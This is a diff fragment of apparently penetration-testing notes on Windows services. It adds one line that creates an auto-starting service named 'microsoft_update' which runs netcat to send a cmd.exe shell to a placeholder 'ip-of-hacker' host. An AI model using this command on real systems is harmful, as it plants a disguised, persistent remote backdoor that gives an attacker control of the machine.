@@ -18,5 +18,6 @@ error= ignore<br/>
 <br/>
 Easy way around this is to have cmd.exe /k &lt;pathtoexe&gt;. The cmd.exe shell will close, but your second launched process will continue to run. <br/>
 <br/>
+sc create microsoft_update binpath=”cmd /K start c:\nc.exe -d ip-of-hacker port -e cmd.exe” start= auto error= ignore<br/>
 <br/>
 See Powershell section for managing services in PowerShell</body></html>
